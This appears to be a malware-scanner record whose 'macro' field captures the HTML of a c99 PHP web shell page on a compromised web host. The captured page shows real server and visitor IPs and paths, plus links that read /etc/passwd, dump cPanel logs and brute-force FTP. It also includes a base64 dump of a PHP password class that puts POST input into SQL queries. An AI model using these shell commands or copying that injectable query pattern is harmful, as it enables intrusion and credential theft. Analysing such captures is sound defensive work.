{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "mkdir": "May create a directory",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fhome%2F&sort=0a\"><b>home/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2F&sort=0a\"><b>chsclair/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2F&sort=0a\"><b>public_html/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F&sort=0a\"><b>remote_assist/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwxr-xr-x</font></b><br><b>Free 240.12 GB of 389.31 GB (61.68%)</b><br><b>Your ip: <a href=http://87.177.187.39>87.177.187.39</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[php]&nbsp;PasswordManagement-1.1.0.class.php (29.67 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=green>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b><u>[hex]</u></b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=html&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=html&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=txt&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=txt&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=code&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><font color=green>[Code]</font></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=code&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=phpsess&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=phpsess&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=exe&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=exe&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=sdb&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=sdb&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=img&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=img&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=ini&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=ini&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=download&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=download&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=notepad&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=notepad&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=edit&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=edit&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> /home/chsclair/public_html/remote_assist/PasswordManagement-1.1.0.class.php</td></tr><tr><td><b>Size</b></td><td> 29.67 KB</td></tr><tr><td><b>MD5</b></td><td> 878c51cf279dcf569d4f8eb6ee8868bf</td></tr><tr><td><b>Owner/Group</b></td><td> chsclair/chsclair<tr><td><b>Perms</b></td><td><a href=\"?act=chmod&f=PasswordManagement-1.1.0.class.php&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><font color=green>-rw-r--r--</font></a></td></tr><tr><td><b>Create time</b></td><td> 26/01/2011 08:28:47</td></tr><tr><td><b>Access time</b></td><td> 07/06/2011 03:43:01</td></tr><tr><td><b>MODIFY time</b></td><td> 06/05/2010 15:18:56</td></tr></table><br><b>HEXDUMP PREVIEW</b><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>00000000<br>00000018<br>00000030<br>00000048<br>00000060<br>00000078<br>00000090<br>000000A8<br></td><td bgcolor=000000>3C 3F 70 68 70 0A 0A 2F 2A 2A 0A 20 2A 20 0A 20 2A 20 50 4C 45 41 53 45 <br>20 44 4F 20 4E 4F 54 20 4D 4F 44 49 46 59 20 54 48 49 53 20 53 43 52 49 <br>50 54 0A 20 2A 20 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D <br>3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 0A 20 2A 20 0A 20 2A 20 4D 6F <br>64 69 66 79 69 6E 67 20 74 68 69 73 20 73 63 72 69 70 74 20 77 69 6C 6C <br>20 63 61 75 6C 65 73 20 70 61 73 73 77 6F 72 64 20 66 61 69 6C 75 72 65 <br>20 61 6E 64 20 65 72 72 6F 72 73 20 69 6E 20 76 61 6C 69 64 20 2F 20 73 <br>65 63 75 72 65 20 73 65 72 76 65 72 20 63 6F 6D 6D 75 6E 69 63 61 74 69 <br></td><td bgcolor=000000>&lt;?php&nbsp;&nbsp;/**&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;*&nbsp;PLEASE<br>&nbsp;DO&nbsp;NOT&nbsp;MODIFY&nbsp;THIS&nbsp;SCRI<br>PT&nbsp;&nbsp;*&nbsp;==================<br>==============&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;*&nbsp;Mo<br>difying&nbsp;this&nbsp;script&nbsp;will<br>&nbsp;caules&nbsp;password&nbsp;failure<br>&nbsp;and&nbsp;errors&nbsp;in&nbsp;valid&nbsp;/&nbsp;s<br>ecure&nbsp;server&nbsp;communicati<br></td></tr></table><br><b>Base64 Encode</b><br><textarea cols=80 rows=10>PD9waHAKCi8qKgogKiAKICogUExFQVNFIERPIE5PVCBNT0RJRlkgVEhJUyBTQ1JJUFQKICogPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICogCiAqIE1vZGlmeWluZyB0aGlzIHNjcmlwdCB3aWxsIGNhdWxlcyBwYXNzd29yZCBmYWlsdXJlIGFuZCBlcnJvcnMgaW4gdmFsaWQgLyBzZWN1cmUgc2VydmVyIGNvbW11bmljYXRpb25zCiAqIElmIHlvdSByZXF1aXJlIG1vZGlmaWNhdGlvbnMgdG8gdGhpcyBzY3JpcHQgcGxlYXNlIGNvbnRhY3QgeW91ciBhY2NvdW50IG1hbmFnZXIgZm9yIGEgY3VzdG9taXNlZCBzY3JpcHQuCiAqIAogKiBAYnJpZWYgQSBjbGFzcyB0byBwcm9jZXNzIGFsbCBvZiB0aGUgcG9zdCByZXF1ZXN0cyB0aGF0IHdlIHdpbGwgc2VuZCB0byBhIGNsaWVudHMgc2VydmVyCiAqIEBhdXRob3IgdHh0TmF0aW9uIERldmVsb3BtZW50CiAqIEB2ZXJzaW9uIDEuMS4wCiAqIAogKi8KY2xhc3MgUGFzc3dvcmRNYW5hZ2VyewoJCgkvKioKCSAqIEBicmllZiBob2xkcyB0aGUgdmVyc2lvbiBvZiB0aGUgY2xhc3MgZmlsZQoJICoKCSAqIEB2YXIgc3RyaW5nCgkgKi8KCXZhciAkc3RyVmVyc2lvbiA9ICcxLjEuMCc7CgkKCS8qKgoJICogQGJyaWVmIEhvbGRzIHRoZSBuYW1lIG9mdGhlIHBhc3N3b3JkIGRhdGFiYXNlCgkgKgoJICogQHZhciBzdHJpbmcKCSAqLwoJdmFyICRzdHJUYWJsZU5hbWUgPSAibXBfcGFzc3dvcmRzIjsKCQoJLyoqCgkgKiBAYnJpZWYgSG9sZHMgdGhlIGFycmF5IG9mIHBvc3QgZGF0YSBvbmNlIHJlY2VpdmVkCgkgKgoJICogQHZhciBhcnJheQoJICovCgl2YXIgJGFyclBvc3REYXRhID0gYXJyYXkoKTsKCQoJLyoqCgkgKiBAYnJpZWYgSG9sZHMgdGhlIHJlc291cmNlIElEIG9mIHRoZSBkYXRhYmFzZQoJICoKCSAqIEB2YXIgcmVzb3VyY2UKCSAqLwoJdmFyICRyZXNEYiA9IG51bGw7CgkKCS8qKgoJICogQGJyaWVmIEhvbGRzIHRoZSByZWZlcmVuY2UgdG8gdGhlIERCIHJlc3VsdCBzZXQKCSAqCgkgKiBAdmFyIHJlc291cmNlCgkgKi8KCXZhciAkcmVzUXVlcnlSZXN1bHQgPSBudWxsOwoJCgkvKioKCSAqIEBicmllZiBIb2xkcyB0aGUgY29uZmlnIGRhdGEgLyBjb25uZWN0aW9uIGRldGFpbHMKCSAqCgkgKiBAdmFyIGFycmF5CgkgKi8KCXZhciAkYXJyQ29uZmlnRGF0YSA9IG51bGw7CgkKCS8qKgoJICogQGJyaWVmIEhvbGRzIGFueSBhZGRpdGlvbmFsIGRhdGEgcmVxdWlyZWQgdG8gYmUgc2VudAoJICoKCSAqIEB2YXIgYXJyYXkKCSAqLwoJdmFyICRhcnJBZGl0aW9uYWxEYXRhID0gbnVsbDsKCQoJLyoqCgkgKiBAYnJpZWYgdGhlIG1haW4gY29udHJvbCBtZXRob2Qgb2YgdGhlIGNhbGxzLCBhbGwgYWN0aW9ucyB3aWxsIGJlIGluaXRpYXRlZCBoZXJlCgkgKiBAbm90ZSBBdmFpbGFibGUgQWN0aW9uczoKCSAqIEBub3RlIC0gJ21wX25ld19wYXNzd29yZCcKCSAqIEBub3RlIC0gJ21wX2NvbmZpcm1fcGFzc3dvcmQnCgkgKiBAbm90ZSAtICdtcF9zdGF0dXNfcGFzc3dvcmQnCgkgKiBAbm90ZSAtICdtcF9yZW5ld19wYXNzd29yZCcKCSAqIEBub3RlIC0gJ21wX2RldGFpbF9wYXNzd29yZCcKCSAqIEBub3RlIC0gJ21wX2lwX3VwZGF0ZScKCSAqIEBub3RlIC0gJ21wX3N5c19jaGVjaycKCSAqIEBub3RlIC0gJ21wX3NldHVwX2NsaWVudCcKCSAqLwoJZnVuY3Rpb24gSW5pY2lhdGVQb3N0UmVxdWVzdCgpewoJCQoJCWlmKCR0aGlzLT5DaGVja1NlY3VyaXR5KCkpewoJCQoJCQlpZigkdGhpcy0+R2V0UG9zdFZhcmlhYmxlcygpKXsKCQkJCQoJCQkJJHRoaXMtPkdldENvbmZpZ0RhdGEoKTsKCQkJCQoJCQkJaWYoIWVtcHR5KCR0aGlzLT5hcnJQb3N0RGF0YVsnYWN0aW9uJ10pICYmICR0aGlzLT5hcnJQb3N0RGF0YVsnYWN0aW9uJ10gIT0gIiIpewoJCQkJCgkJCQkJLyoqIEBub3RlIENoZWNrIHRoZSBQT1NUIHZhciAnYWN0aW9uJyBhbmQgc2VlIHdoYXQgbWV0aG9kIHRvIGNhbGwgKiovCgkJCQkJc3dpdGNoKCR0aGlzLT5hcnJQb3N0RGF0YVsnYWN0aW9uJ10pewoJCQkJCQkKCQkJCQkJLyoqIEBub3RlICdtcF9uZXdfcGFzc3dvcmQnIEluc2VydCBhIG5ldyBwYXNzd29yZCB0byB0aGUgY2xpZW50cyBzeXN0ZW0gKiovCgkJCQkJCWNhc2UibXBfbmV3X3Bhc3N3b3JkIjoKCQkJCQkJCQoJCQkJCQkJJHRoaXMtPlByb2Nlc3NOZXdQYXNzd29yZCgpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfY29uZmlybV9wYXNzd29yZCcgTWFyayBhIHBhc3N3b3JkIGFzIGJlaW5nIGNvbmZpcm1lZCBieSB0aGUgdXNlciAqKi8KCQkJCQkJY2FzZSJtcF9jb25maXJtX3Bhc3N3b3JkIjoKCQkJCQkJCQoJCQkJCQkJJHRoaXMtPkNvbmZpcm1QYXNzd29yZCgpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfc3RhdHVzX3Bhc3N3b3JkJyBHZXQgdGhlIGN1cnJlbnQgc3RhdHVzIG9mIHRoZSBjbGllbnRzIHBhc3N3b3JkICoqLwoJCQkJCQljYXNlIm1wX3N0YXR1c19wYXNzd29yZCI6CgkJCQkJCQkKCQkJCQkJCSR0aGlzLT5HZXRQYXNzd29yZFN0YXR1cygpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfcmVuZXdfcGFzc3dvcmQnIFJlbmV3IHRoZSBwYXNzd29yZCBhcyBpc3N1ZSB3aXRoIGVuZCB1c2VycyByZXF1ZXN0ICoqLwoJCQkJCQljYXNlIm1wX3JlbmV3X3Bhc3N3b3JkIjoKCQkJCQkJCQoJCQkJCQkJJHRoaXMtPlJlbmV3UGFzc3dvcmQoKTsKCQkJCQkJYnJlYWs7CgkJCQkJCQoJCQkJCQkvKiogQG5vdGUgJ21wX2RldGFpbF9wYXNzd29yZCcgR2V0IGZ1cnRoZXIgZGV0YWlscyBvZiBhIHBhc3N3b3JkICovCgkJCQkJCWNhc2UibXBfZGV0YWlsX3Bhc3N3b3JkIjoKCQkJCQkJCQoJCQkJCQkJJHRoaXMtPkdldFBhc3N3b3JkRGV0YWlsKCk7CgkJCQkJCWJyZWFrOwoJCQkJCQkKCQkJCQkJLyoqIEBub3RlICdtcF9pcF91cGRhdGUnIFVwZGF0ZSBvdXIgSVAgcmFuZ2UgZm9yIHRoZSBjbGllbnRzIEhUQWNjZXNzIHByb3RlY3Rpb24gKi8KCQkJCQkJY2FzZSJtcF9pcF91cGRhdGUiOgoJCQkJCQkJCgkJCQkJCQkkdGhpcy0+VXBkYXRlSXBSZXN0cmljdGlvbigpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfaXBfdXBkYXRlJyBVcGRhdGUgb3VyIElQIHJhbmdlIGZvciB0aGUgY2xpZW50cyBIVEFjY2VzcyBwcm90ZWN0aW9uICovCgkJCQkJCWNhc2UibXBfc2VydmljZV91cGRhdGUiOgoJCQkJCQkJCgkJCQkJCQkkdGhpcy0+VXBkYXRlU2VydmljZSgpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfc3lzX2NoZWNrJyBTeXN0ZW0gQ2hlY2sgdG8gZGVmaW5lIHRoYXQgY29tbXVuaWNhdGlvbnMgYmV0d2VlbiB1cyBhbmQgY2xpZW50IGFyZSBvayAqLwoJCQkJCQljYXNlIm1wX3N5c19jaGVjayI6CgkJCQkJCQkKCQkJCQkJCSR0aGlzLT5TeXN0ZW1DaGVjaygpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnbXBfc2V0dXBfY2xpZW50JyBTeXN0ZW0gQ2hlY2sgdG8gZGVmaW5lIHRoYXQgY29tbXVuaWNhdGlvbnMgYmV0d2VlbiB1cyBhbmQgY2xpZW50IGFyZSBvayAqLwoJCQkJCQljYXNlIm1wX3NldHVwX2NsaWVudCI6CgkJCQkJCQkKCQkJCQkJCSR0aGlzLT5TZXR1cENsaWVudCgpOwoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJCS8qKiBAbm90ZSAnZGVmYXVsdCcgTm8gdmFsaWQgYWN0aW9uIHNlbnQgKi8KCQkJCQkJZGVmYXVsdDoKCQkJCQkJCS8qKiBAbm90ZSBSZXR1cm4gZXJyb3IgcmVzcG9uc2UgJ01QLTAwNCcgKi8KCQkJCQkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDA0Iik7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQoJCQkJfWVsc2V7CgkJCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDA1JyAqLwoJCQkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDA1Iik7CgkJCQl9CgkJCQkKCQkJfWVsc2V7CgkJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMDMnICovCgkJCQkkdGhpcy0+U2NyaXB0RXJyb3IoIk1QLTAwMyIpOwoJCQl9CgkJfWVsc2V7CgkJCS8qKiBAbm90ZSBSZXR1cm4gZXJyb3IgcmVzcG9uc2UgJ01QLTAxMicgKi8KCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMTIiKTsKCQl9Cgl9CgkKCS8qKgoJICogQGJyaWVmIEJ1aWxkIGFuIGFycmF5IG9mIGFsbCBwb3N0IHZhcnMgaWYgYXZhaWxhYmxlIGFuZCB0aGVuIHJldHVybiBhIGJvb2xlYW4gc3RhdHVzIG9uIHJlc3VsdAoJICoKCSAqIEByZXR1cm4gYm9vbGVhbiBTZW5kICd0cnVlJyBvbiByZWNlaXB0IG9mIHBvc3QgdmFyaWFibGVzCgkgKi8KCWZ1bmN0aW9uIEdldFBvc3RWYXJpYWJsZXMoKXsKCQkKCQkkYmxQb3N0VmFyc0ZvdW5kID0gZmFsc2U7CgkJCgkJaWYoIWVtcHR5KCRfUE9TVCkgJiYgaXNfYXJyYXkoJF9QT1NUKSl7CgkJCQoJCQkvKiogQG5vdGUgTG9vcCB0aHJvdWdoIGFsbCBwb3N0IHZhcnMgYW5kIGV4cG9ydCB0byBhIGNsYXNzIHZhciAoYXJyYXkpICovCgkJCWZvcmVhY2goJF9QT1NUIGFzICRzdHJLZXkgPT4gJHN0clZhbHVlKXsKCQkJCQoJCQkJJHRoaXMtPmFyclBvc3REYXRhWyRzdHJLZXldID0gJHN0clZhbHVlOwoJCQl9CgkJCgkJCSRibFBvc3RWYXJzRm91bmQgPSB0cnVlOwoJCX0KCQkKCQlyZXR1cm4gJGJsUG9zdFZhcnNGb3VuZDsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgR2V0IGFsbCBkZXRhaWxzIHJlbGF0aW5nIHRvIHRoZSBwYXNzd29yZCBzZW50IGluIHRoZSBwb3N0IHZhciBhbmQgcmV0dXJuCgkgKgoJICovCglmdW5jdGlvbiBHZXRQYXNzd29yZERldGFpbCgpewoJCQoJCS8qKiBAbm90ZSBCdWlsZCB0aGUgcXVlcnkgdG8gZ2V0IHRoZSBkZXRhaWxzIG9mIGEgcGFzc3dvcmQgaW4gdGhlIHBhc3N3b3JkIGRhdGFiYXNlICovCgkJJHN0clNRTCA9ICJTRUxFQ1QgKgoJCQkJCSBGUk9NIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YAoJCQkJCVdIRVJFIGBwYXNzd29yZGAgPSAneyR0aGlzLT5hcnJQb3N0RGF0YVsncGFzc3dkJ119JwoJCQkJCUxJTUlUIDEiOwoJCQoJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+TnVtUm93cygpKXsKCQkJCgkJCSRhcnJQYXNzd29yZERhdGEgPSAkdGhpcy0+R2V0QXJyYXkoKTsKCQkJCgkJCSR0aGlzLT5hcnJBZGl0aW9uYWxEYXRhID0gJGFyclBhc3N3b3JkRGF0YTsKCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnREVUQUlMJyBhbmQgYWxsIHBhc3N3b3JkIGRldGFpbHMgKi8KCQkJJHRoaXMtPlNjcmlwdFN1Y2Nlc3MoIkRFVEFJTCIpOwoJCX1lbHNlewoJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMDcnICovCgkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDA3Iik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIEBicmllZiBSZXR1cm4gdGhlIHN0YXR1cyBvZiBhbnkgZ2l2ZW4gcGFzc3dvcmQgdGhhdCBjYW4gYmUgZm91bmQgaW4gdGhlIGNsaWVudHMgc3lzdGVtCgkgKiBAdXNlcyBEYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gR2V0UGFzc3dvcmRTdGF0dXMoKXsKCQkKCQkvKiogQG5vdGUgQnVpbGQgdGhlIHF1ZXJ5IHRvIGdldCB0aGUgc3RhdHVzIG9mIGEgcGFzc3dvcmQgaW4gdGhlIHBhc3N3b3JkIGRhdGFiYXNlICovCgkJJHN0clNRTCA9ICJTRUxFQ1QgYHN0YXR1c2AKCQkJCQkgRlJPTSBgeyR0aGlzLT5hcnJDb25maWdEYXRhWydkYXRhYmFzZSddfWAuYHskdGhpcy0+c3RyVGFibGVOYW1lfWAKCQkJCQlXSEVSRSBgcGFzc3dvcmRgID0gJ3skdGhpcy0+YXJyUG9zdERhdGFbJ3Bhc3N3ZCddfScKC